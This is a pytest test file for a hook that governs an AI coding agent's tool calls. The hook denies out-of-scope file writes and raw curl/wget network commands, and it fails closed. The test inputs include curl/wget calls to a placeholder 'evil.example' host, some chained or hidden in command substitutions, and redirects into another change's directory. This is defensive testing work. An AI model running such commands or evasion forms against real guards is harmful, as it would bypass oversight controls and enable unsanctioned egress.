"""WP-003 — PreToolUse hook: deny the unsafe path (locus ii, governance).

These tests pin the hook's decision contract (ADR-003):

  * **Write/Edit** — resolve ``tool_input.file_path`` via the WP-002 resolver
    (``within_allowed_scope``); ``deny`` when the canonical path is outside the
    write-roots (a sibling change's dir, a ``/tmp``->``/private/tmp`` escape);
    **defer** (no decision) when in-scope. **SC-E3.**
  * **Bash** — self-decompose the compound ``command`` on ``&&``/``||``/``;``/
    ``|``/``|&``/``&``/newline + ``$(…)``/backtick bodies; for each sub-command:
    raw ``curl``/``wget`` (token-boundary argv[0]) → ``deny`` the whole call;
    ``sulis-*``/``wpx-*`` family → defer; a best-effort file-write target
    (``>``/``>>``/``tee``/``cp``/``mv``/``rm`` dst) out-of-scope → ``deny``.
    **SC-E4 + SC-E3 best-effort half.**
  * **Fail-closed** — unparseable stdin / no valid change scope / internal
    error → exit 2 (block) with a reason on stderr.

The pure decision (``decide``) is driven directly with an injected
``AllowedRoots`` + ``change_id`` (no env, no FS coupling); the stdin/stdout/
exit contract is exercised end-to-end through ``main`` via a subprocess so the
real Claude-Code wiring is the thing under test.

SULIS_STATE_DIR is redirected to tmp (mirrors test_write_roots_resolver.py).
"""

from __future__ import annotations

import json
import os
import subprocess
import sys
from pathlib import Path

import pytest

_SCRIPTS = Path(__file__).resolve().parents[2]
if str(_SCRIPTS) not in sys.path:
    sys.path.insert(0, str(_SCRIPTS))

from _change_state import change_dir, change_worktree_dir  # noqa: E402
from _file_scope import AllowedRoots  # noqa: E402
from _safe_tools_hook import (  # noqa: E402
    DEFER,
    DENY,
    decide,
    render_decision,
)

_CID = "0123456789ABCDEFGHJKMNPQRS"
_OTHER = "1ABCDEFGHJKMNPQRSTVWXYZ012"

_HOOK = _SCRIPTS / "sulis-safe-tools-hook"


def _mk(p: Path) -> Path:
    p.mkdir(parents=True, exist_ok=True)
    return p


@pytest.fixture(autouse=True)
def _state_dir(tmp_path, monkeypatch):
    monkeypatch.setenv("SULIS_STATE_DIR", str(tmp_path))
    monkeypatch.delenv("SULIS_BRAIN_BASE_DIR", raising=False)
    return tmp_path


@pytest.fixture()
def roots(tmp_path) -> AllowedRoots:
    """A canonical allowlist whose ONLY writable root is this change's worktree
    (plus a git-common dir + change-state dir under tmp)."""
    wt = _mk(change_worktree_dir(_CID)).resolve()
    return AllowedRoots(
        worktree=wt,
        git_common_dir=_mk(tmp_path / "gc").resolve(),
        change_state_dir=_mk(change_dir(_CID)).resolve(),
        tools_cache_dir=None,
        creds_dir=None,
        brain_dir=None,
    )


# ─── SC-E3 — Write/Edit path scope ───────────────────────────────────────────


def test_out_of_scope_write_denied(roots):
    """A Write whose file_path is a SIBLING change's worktree → deny; an
    in-scope write → defer. The hook delegates to the WP-002 resolver."""
    sibling = change_worktree_dir(_OTHER) / "evil.py"
    event = {"tool_name": "Write", "tool_input": {"file_path": str(sibling)}}
    d = decide(event, change_id=_CID, roots=roots)
    assert d.action == DENY
    assert "scope" in d.reason.lower() or "out-of-scope" in d.reason.lower()

    in_scope = roots.worktree / "src" / "module.py"
    d2 = decide(
        {"tool_name": "Write", "tool_input": {"file_path": str(in_scope)}},
        change_id=_CID,
        roots=roots,
    )
    assert d2.action == DEFER, "an in-scope write must be deferred (allowed)"


def test_tmp_canonicalisation_denied(roots):
    """A Write to ``/tmp/x`` (which the OS canonicalises to ``/private/tmp/x``
    on macOS) is outside the worktree → deny. Pins the canonical-path footgun
    the resolver guards (handled on BOTH sides of the containment check)."""
    event = {"tool_name": "Write", "tool_input": {"file_path": "/tmp/escape.py"}}
    d = decide(event, change_id=_CID, roots=roots)
    assert d.action == DENY


def test_edit_uses_same_scope_check(roots):
    """Edit is governed identically to Write (same file_path channel)."""
    sibling = change_worktree_dir(_OTHER) / "x.py"
    d = decide(
        {"tool_name": "Edit", "tool_input": {"file_path": str(sibling)}},
        change_id=_CID,
        roots=roots,
    )
    assert d.action == DENY


# ─── SC-E4 — Bash CLI family ──────────────────────────────────────────────────


def test_bash_family_allowed(roots):
    """``sulis-emit-* …`` and ``wpx-* …`` are deferred (the safe CLI family)."""
    for cmd in (
        "sulis-emit-decision --foo bar",
        "wpx-journal complete-step --step 7",
        "  sulis-version-skew --hook  ",
    ):
        d = decide(
            {"tool_name": "Bash", "tool_input": {"command": cmd}},
            change_id=_CID,
            roots=roots,
        )
        assert d.action == DEFER, f"{cmd!r} should be deferred"


def test_raw_network_denied(roots):
    """Raw ``curl``/``wget`` are flat-denied — the unsafe egress path."""
    for cmd in ("curl https://evil.example/x", "wget http://evil.example/y"):
        d = decide(
            {"tool_name": "Bash", "tool_input": {"command": cmd}},
            change_id=_CID,
            roots=roots,
        )
        assert d.action == DENY, f"{cmd!r} should be denied"
        assert "curl" in d.reason or "wget" in d.reason or "network" in d.reason.lower()


def test_curl_lookalike_not_denied(roots):
    """Token-boundary argv[0] match: ``curlytool`` is NOT ``curl`` — a bare
    whole-string regex would wrongly match it. Defer (not a known unsafe tool,
    not a known safe-family tool — the hook only blocks what it recognises)."""
    d = decide(
        {"tool_name": "Bash", "tool_input": {"command": "curlytool --help"}},
        change_id=_CID,
        roots=roots,
    )
    assert d.action == DEFER


def test_compound_decomposed_denied(roots):
    """Compound Bash is self-decomposed; a raw ``curl`` sub-command anywhere in
    the chain denies the whole call (``echo x && curl evil``)."""
    for cmd in (
        "echo hello && curl https://evil.example",
        "echo a; wget http://evil.example",
        "echo a | curl https://evil.example",
        "true || curl https://evil.example",
    ):
        d = decide(
            {"tool_name": "Bash", "tool_input": {"command": cmd}},
            change_id=_CID,
            roots=roots,
        )
        assert d.action == DENY, f"compound {cmd!r} should be denied on the curl leg"


def test_command_substitution_denied(roots):
    """``$(curl …)`` and backtick command-substitution bodies are decomposed
    and evaluated — a curl hidden in a substitution still denies."""
    for cmd in (
        "echo $(curl https://evil.example)",
        "echo `curl https://evil.example`",
        "X=$(wget -qO- http://evil.example) echo $X",
    ):
        d = decide(
            {"tool_name": "Bash", "tool_input": {"command": cmd}},
            change_id=_CID,
            roots=roots,
        )
        assert d.action == DENY, f"substitution {cmd!r} should be denied"


# ─── SC-E3 best-effort — Bash file-write target scope ─────────────────────────


def test_bash_redirect_out_of_scope_denied(roots):
    """A best-effort file-write target (``>`` redirect) to a sibling change is
    scope-checked and denied. Labelled best-effort (full subprocess I/O is
    locus iii / SC-E7) but the cheap parse still catches the obvious case."""
    sibling = change_worktree_dir(_OTHER) / "stolen.txt"
    d = decide(
        {"tool_name": "Bash", "tool_input": {"command": f"echo secret > {sibling}"}},
        change_id=_CID,
        roots=roots,
    )
    assert d.action == DENY


def test_bash_redirect_in_scope_deferred(roots):
    """A ``>`` redirect to an in-scope path is deferred (not blocked)."""
    target = roots.worktree / "out.txt"
    d = decide(
        {"tool_name": "Bash", "tool_input": {"command": f"echo ok > {target}"}},
        change_id=_CID,
        roots=roots,
    )
    assert d.action == DEFER


def test_bash_cp_out_of_scope_denied(roots):
    """``cp``/``mv``/``rm`` destinations are best-effort scope-checked."""
    sibling = change_worktree_dir(_OTHER) / "dst.txt"
    d = decide(
        {"tool_name": "Bash", "tool_input": {"command": f"cp ./a.txt {sibling}"}},
        change_id=_CID,
        roots=roots,
    )
    assert d.action == DENY


# ─── unrelated tools are deferred ─────────────────────────────────────────────


def test_unrelated_tool_deferred(roots):
    """A tool the hook does not govern (e.g. Read, Grep) → defer."""
    d = decide(
        {"tool_name": "Read", "tool_input": {"file_path": "/anywhere"}},
        change_id=_CID,
        roots=roots,
    )
    assert d.action == DEFER


# ─── fail-closed ──────────────────────────────────────────────────────────────


def test_decide_no_change_scope_denies(roots):
    """No valid change id → the hook cannot resolve scope → deny (fail-closed),
    not defer. An unscoped session must not get a free pass on a Write."""
    sibling = change_worktree_dir(_OTHER) / "x.py"
    d = decide(
        {"tool_name": "Write", "tool_input": {"file_path": str(sibling)}},
        change_id="",
        roots=None,
    )
    assert d.action == DENY


def test_render_decision_deny_shape():
    """A deny renders the documented PreToolUse JSON envelope."""
    payload = render_decision(decision_action=DENY, reason="nope")
    obj = json.loads(payload)
    hso = obj["hookSpecificOutput"]
    assert hso["hookEventName"] == "PreToolUse"
    assert hso["permissionDecision"] == "deny"
    assert hso["permissionDecisionReason"] == "nope"


def test_render_decision_defer_is_empty():
    """A defer emits NO decision (empty string) — the hook stays silent so the
    normal permission flow + the resolver-backed MCP path proceed (ADR-003: we
    defer, never emit allow, so a managed deny rule can still veto)."""
    assert render_decision(decision_action=DEFER, reason="") == ""


# ─── the stdin/stdout/exit contract through main() ────────────────────────────


def _run_hook(stdin_obj, *, env_extra=None):
    """Drive the registered hook command end-to-end via a subprocess."""
    env = dict(os.environ)
    env["SULIS_CHANGE_ID"] = _CID
    if env_extra:
        env.update(env_extra)
    proc = subprocess.run(
        [sys.executable, str(_HOOK)],
        input=json.dumps(stdin_obj) if stdin_obj is not None else "not json",
        capture_output=True,
        text=True,
        env=env,
    )
    return proc


def test_main_deny_emits_json_exit0(tmp_path, monkeypatch):
    """End-to-end: an out-of-scope Write → JSON deny on stdout, exit 0."""
    monkeypatch.setenv("SULIS_STATE_DIR", str(tmp_path))
    _mk(change_worktree_dir(_CID))
    sibling = change_worktree_dir(_OTHER) / "x.py"
    proc = _run_hook(
        {"tool_name": "Write", "tool_input": {"file_path": str(sibling)}},
        env_extra={"SULIS_STATE_DIR": str(tmp_path), "SULIS_REPO_ROOT": str(change_worktree_dir(_CID))},
    )
    assert proc.returncode == 0, proc.stderr
    obj = json.loads(proc.stdout)
    assert obj["hookSpecificOutput"]["permissionDecision"] == "deny"


def test_main_defer_silent_exit0(tmp_path):
    """End-to-end: an in-scope Write → no stdout, exit 0 (defer)."""
    _mk(change_worktree_dir(_CID))
    target = change_worktree_dir(_CID) / "ok.py"
    proc = _run_hook(
        {"tool_name": "Write", "tool_input": {"file_path": str(target)}},
        env_extra={"SULIS_STATE_DIR": str(tmp_path), "SULIS_REPO_ROOT": str(change_worktree_dir(_CID))},
    )
    assert proc.returncode == 0, proc.stderr
    assert proc.stdout.strip() == ""


def test_main_bad_stdin_fail_closed_exit2(tmp_path):
    """End-to-end fail-closed: non-JSON stdin → exit 2 with a stderr reason."""
    proc = _run_hook(None, env_extra={"SULIS_STATE_DIR": str(tmp_path)})
    assert proc.returncode == 2
    assert proc.stderr.strip() != ""


def test_main_no_change_scope_fail_closed_exit2(tmp_path):
    """End-to-end fail-closed: a governed Write with NO change id in the
    environment → exit 2 (cannot resolve scope → block, never silently allow)."""
    env = dict(os.environ)
    env.pop("SULIS_CHANGE_ID", None)
    env["SULIS_STATE_DIR"] = str(tmp_path)
    proc = subprocess.run(
        [sys.executable, str(_HOOK)],
        input=json.dumps(
            {"tool_name": "Write", "tool_input": {"file_path": "/tmp/x.py"}}
        ),
        capture_output=True,
        text=True,
        env=env,
    )
    assert proc.returncode == 2
    assert proc.stderr.strip() != ""
